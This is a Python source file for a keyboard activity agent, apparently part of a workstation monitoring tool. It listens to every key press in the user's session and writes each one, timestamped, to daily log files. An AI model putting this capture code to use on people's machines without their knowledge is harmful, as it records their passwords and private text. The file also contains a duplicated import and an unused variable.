"""
Standalone keyboard activity agent.

This process is spawned by KeyboardMonitor into the active interactive
user session so that pynput can receive keyboard activity.

IMPORTANT:
    This agent records pressed keys using printable characters for normal
    keys and bracketed names such as ``[space]`` or ``[enter]`` for
    special keys.

Usage:
    python keylogger_agent.py <keyboard_root_dir> <diagnostic_log_file>
"""

import logging
import os
import sys
import threading
from datetime import datetime
from pathlib import Path

from pynput import keyboard
from monitoring.utils import format_logged_key

from utils import format_logged_key


AGENT_NAME = "keyboard_agent"


def get_daily_log_file(keyboard_dir: str) -> str:
    """
    Return today's keyboard activity log file.

    Structure:

        keyboard/
            YYYY/
                MM/
                    DD/
                        keyboard.log
    """

    now = datetime.now()

    day_dir = (
        Path(keyboard_dir)
        / now.strftime("%Y")
        / now.strftime("%m")
        / now.strftime("%d")
    )

    day_dir.mkdir(
        parents=True,
        exist_ok=True,
    )

    return str(day_dir / "keyboard.log")


def setup_logger(diag_log: str) -> logging.Logger:
    """
    Configure diagnostic logger.

    Diagnostic logs remain flat:

        C:\\WorkstationMonitor\\logs\\keyboard_agent.log
    """

    diag_log = os.path.abspath(diag_log)

    log_dir = os.path.dirname(diag_log)

    if log_dir:
        os.makedirs(
            log_dir,
            exist_ok=True,
        )

    logger = logging.getLogger(AGENT_NAME)

    logger.setLevel(logging.INFO)

    # Avoid duplicate handlers if setup_logger() is called more than once.
    logger.handlers.clear()

    handler = logging.FileHandler(
        diag_log,
        encoding="utf-8",
    )

    formatter = logging.Formatter(
        "%(asctime)s %(levelname)-8s %(name)s - %(message)s"
    )

    handler.setFormatter(formatter)

    logger.addHandler(handler)

    # Prevent propagation to the root logger.
    logger.propagate = False

    return logger


def ensure_daily_log(
    keyboard_dir: str,
    logger: logging.Logger,
) -> str:
    """
    Make sure today's keyboard.log exists.
    """

    log_file = get_daily_log_file(keyboard_dir)

    try:
        Path(log_file).touch(
            exist_ok=True,
        )

        return log_file

    except OSError:
        logger.exception(
            "Failed to create daily keyboard log: %s",
            log_file,
        )

        raise


def write_activity_event(
    keyboard_dir: str,
    logger: logging.Logger,
    write_lock: threading.Lock,
    key:str,
) -> None:
    """
    Write one keyboard event.
    """

    now = datetime.now()

    log_file = get_daily_log_file(keyboard_dir)
    logged_key = format_logged_key(key)

    # key1 = format_logged_key(key)

    entry = (
        f"{now.isoformat(timespec='seconds')} "
        f"{key}\n"
    )

    try:
        # pynput callbacks should remain lightweight.
        # The lock prevents concurrent writes from overlapping.
        with write_lock:

            with open(
                log_file,
                "a",
                encoding="utf-8",
            ) as fh:

                fh.write(entry)
                fh.flush()

    except OSError:
        logger.exception(
            "Failed writing keyboard activity to: %s",
            log_file,
        )


def main() -> None:
    """
    Agent entry point.
    """

    if len(sys.argv) < 2:
        print(
            "Usage: keylogger_agent.py "
            "<keyboard_root_dir> "
            "[diagnostic_log_file]",
            file=sys.stderr,
        )

        sys.exit(1)

    # ------------------------------------------------------------------
    # Arguments
    # ------------------------------------------------------------------

    keyboard_dir = os.path.abspath(
        sys.argv[1]
    )

    if len(sys.argv) >= 3:

        diag_log = os.path.abspath(
            sys.argv[2]
        )

    else:

        # Fallback only.
        # In production KeyboardMonitor should explicitly provide
        # C:\WorkstationMonitor\logs\keyboard_agent.log
        diag_log = os.path.join(
            os.path.dirname(keyboard_dir),
            "logs",
            "keyboard_agent.log",
        )

    # ------------------------------------------------------------------
    # Prepare directories
    # ------------------------------------------------------------------

    try:

        os.makedirs(
            keyboard_dir,
            exist_ok=True,
        )

    except OSError as exc:

        print(
            f"Failed to create keyboard directory: {exc}",
            file=sys.stderr,
        )

        sys.exit(1)

    # ------------------------------------------------------------------
    # Logger
    # ------------------------------------------------------------------

    logger = setup_logger(
        diag_log
    )

    logger.info(
        "Keyboard agent starting"
    )

    logger.info(
        "Keyboard root directory: %s",
        keyboard_dir,
    )

    logger.info(
        "Diagnostic log: %s",
        diag_log,
    )

    # ------------------------------------------------------------------
    # Create today's log
    # ------------------------------------------------------------------

    try:

        daily_log = ensure_daily_log(
            keyboard_dir,
            logger,
        )

        logger.info(
            "Daily keyboard log: %s",
            daily_log,
        )

    except Exception:

        logger.exception(
            "Keyboard agent initialization failed"
        )

        sys.exit(1)

    # ------------------------------------------------------------------
    # Thread synchronization
    # ------------------------------------------------------------------

    write_lock = threading.Lock()

    # ------------------------------------------------------------------
    # Keyboard callback
    # ------------------------------------------------------------------

    def on_press(_key) -> None:

        key = format_logged_key(_key)

        write_activity_event(
            keyboard_dir=keyboard_dir,
            logger=logger,
            write_lock=write_lock,
            key=key,
        )

    # ------------------------------------------------------------------
    # Start keyboard listener
    # ------------------------------------------------------------------

    listener = None

    try:

        listener = keyboard.Listener(
            on_press=on_press,
        )

        listener.start()

        logger.info(
            "Keyboard listener started successfully"
        )

        # Keep process alive.
        listener.join()

        logger.info(
            "Keyboard listener stopped"
        )

    except Exception:

        logger.exception(
            "Keyboard agent crashed"
        )

        raise

    finally:

        if listener is not None:

            try:
                listener.stop()

            except Exception:
                logger.exception(
                    "Failed to stop keyboard listener"
                )


if __name__ == "__main__":

    try:

        main()

    except KeyboardInterrupt:

        pass

    except Exception:

        # Last-resort diagnostic output.
        # Logger normally handles the exception above.
        sys.exit(1)